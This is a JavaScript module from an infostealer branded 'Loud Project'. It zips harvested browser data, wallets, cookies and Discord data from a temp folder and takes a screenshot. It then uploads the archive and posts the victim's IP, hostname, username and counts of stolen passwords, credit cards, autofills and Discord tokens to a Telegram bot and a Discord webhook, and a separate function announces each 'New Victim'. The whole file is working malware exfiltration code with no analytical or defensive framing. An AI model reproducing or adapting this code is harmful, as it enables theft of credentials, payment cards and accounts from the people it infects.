const axios = require("axios");
const fs = require("fs");
const path = require("path");
const { rdm, wbk, tlg, identifier } = require("../../../data/Config");
const screenShot = require("../../../functions/system/screenshot");
const upload = require("../../../functions/utils/upload");
const net = require("../../../functions/utils/net");
const AdmZip = require("adm-zip");
const os = require("os");
let { state } = require("../../../data/data");
let {passwordCount, passwordsBrowserUsed, 
cookieCount, cookiesBrowserUsed, 
autofillCount, autofilldataBrowserUsed, 
ccCount, cardsBrowserUsed, tokens } = state

async function AllInformations() {
  const baseDir = path.join(process.env.TEMP, "LoudProject", rdm);
  if (!fs.existsSync(baseDir) || !fs.readdirSync(baseDir).length) return;

  try {
    console.log("[+] Taking screenshot...");
    await screenShot();

    console.log("[+] Getting IP address...");
    const ip = await net.getIp();

    let str = "";
    const entries = fs.readdirSync(baseDir);
    for (const file of entries) {
      const fullPath = path.join(baseDir, file);

      try {
        if (["cookies", "Wallets", "Discord", "Gecko", "Chromium"].includes(file)) {
          const files = fs.readdirSync(fullPath);
          const size = files.reduce((acc, f) => {
            const fPath = path.join(fullPath, f);
            return acc + fs.statSync(fPath).size;
          }, 0);
          str = `\n🗂️ ${file} - ${formatBytes(size)}` + str;
        } else if (file === "DigitalEntitlements") {
          str += `\n💎 ${file} - ${formatBytes(fs.statSync(fullPath).size)}`;
        } else {
          str += `\n📄 ${file} - ${formatBytes(fs.statSync(fullPath).size)}`;
        }
      } catch (e) {
        console.warn(`[!] Failed to process file: ${file}`, e.message);
      }
    }

    console.log("[+] Creating zip archive...");
    const zipPath = path.join(process.env.TEMP, "LoudProject", `${rdm}.zip`);
    const archive = new AdmZip();
    archive.addLocalFolder(baseDir);
    archive.writeZip(zipPath);

    console.log("[+] Uploading zip file...");
    const linked = await upload(zipPath).catch(() => null);

    const cpu = os.cpus()[0].model;
    const ram = os.totalmem();
    const ramingb = (ram / 1024 / 1024 / 1024).toFixed(2);
    const version = os.version();

    console.log("[+] Sending Telegram info...");
    await axios.post(tlg, {
      text: `🌎 Loud Project | [Browser Data](${linked})\n\n🔑 Passwords: ${passwordCount.value} (${Array.from(passwordsBrowserUsed).join(", ")})\n🍪 Cookies: ${cookieCount.value} (${Array.from(
        cookiesBrowserUsed).join(", ")})\n📋 Autofills: ${autofillCount.value} (${Array.from(autofilldataBrowserUsed).join(", ")})`,
    }).catch(() => null);

    console.log("[+] Sending Webhook embed...");
    await axios.post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 2829617,
          fields: [
            { name: "Passwords", value: `\`\`\`${passwordCount.value}\`\`\``, inline: true },
            { name: "Cookies", value: `\`\`\`${cookieCount.value}\`\`\``, inline: true },
            { name: "Credit Cards", value: `\`\`\`${ccCount.value}\`\`\``, inline: true },
            { name: "Autofills", value: `\`\`\`${autofillCount.value}\`\`\``, inline: true },
            { name: "Discord Tokens", value: `\`\`\`${tokens.length}\`\`\``, inline: true },
            { name: "Identifier", value: `\`\`\`${identifier}\`\`\``, inline: true },
            {
              name: "Computer",
              value: `\`\`\`IP Adress : ${ip}\nHostname  : ${os.hostname()}\nRAM  : ${ramingb} GB\nCPU  : ${cpu}\nVersion  : ${version}\nUptime  : ${(os.uptime() / 60).toFixed(0)} minutes\nHome Dir  : ${os.homedir()}\nComputer Name  : ${os.userInfo().username}\`\`\``
            },
            {
              name: "Browser",
              value: `\`\`\`🍪 Cookies: ${cookiesBrowserUsed.size ? Array.from(cookiesBrowserUsed).join(", ") : "Not Found"}\n🔑 Passwords: ${
                passwordsBrowserUsed.size ? Array.from(passwordsBrowserUsed).join(", ") : "Not Found"
              }\n💳 Credit cards: ${cardsBrowserUsed.size ? Array.from(cardsBrowserUsed).join(", ") : "Not Found"}\n📋 Autofills: ${
                autofilldataBrowserUsed.size ? Array.from(autofilldataBrowserUsed).join(", ") : "Not Found"
              }\`\`\``,
              inline: true
            },
            {
              name: "ZIP File content",
              value: `\`\`\`Zip folder's content:\n${str}\`\`\``,
            },
            {
              name: "Download All Informations",
              value: `<:download:917499025282973766> [\`${rdm}.zip\`](${linked})`,
              inline: false,
            },
          ],
          color: 13172927,
          author: {
            name: "Informations",
            icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
          },
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
        },
      ],
    }).catch(() => null);

    console.log("[✓] Informations sent successfully.");

  } catch (err) {
    console.error("[!] Error in AllInformations:", err.message);
  }
}

function formatBytes(a, b = 2) {
  if (!+a) return "0 B";
  const units = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(a) / Math.log(1024));
  return `${(a / Math.pow(1024, i)).toFixed(b)} ${units[i]}`;
}

async function sendTelegram() {
  const baseDir = path.join(process.env.TEMP, "LoudProject", rdm);
  if (!fs.existsSync(baseDir) || !fs.readdirSync(baseDir).length) return;

  const ip = await net.getIp();
  const cpu = os.cpus()[0].model;
  const ram = os.totalmem();
  const ramingb = (ram / 1024 / 1024 / 1024).toFixed(2);
  const version = os.version();

  await axios.post(tlg, {
    text: `🎯 Loud Project | New Victim\n\n💻 Computer: ${os.userInfo().username}\n🔧 Ram: ${ramingb} GB\n💾 CPU: ${cpu}\n\n🧠 IP: ${ip}\n📡 System Informations: ${version}\n⏲️ Uptime: ${(os.uptime() / 60).toFixed(0)} minutes`,
  }).catch(() => null);
}

module.exports = { AllInformations, sendTelegram };
